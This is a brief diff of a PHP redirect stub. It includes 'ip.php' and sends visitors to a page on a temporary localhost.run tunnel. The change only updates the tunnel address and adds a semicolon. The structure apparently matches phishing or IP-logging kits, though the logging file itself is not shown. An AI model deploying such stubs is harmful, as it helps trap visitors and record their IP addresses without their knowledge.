@@ -1,5 +1,5 @@
 <?php
 include 'ip.php';
-header('Location: https://6e5f075431d01f.lhr.life/index2.html');
-exit
+header('Location: https://7aeea44d6a0505.lhr.life/index2.html');
+exit;
 ?>
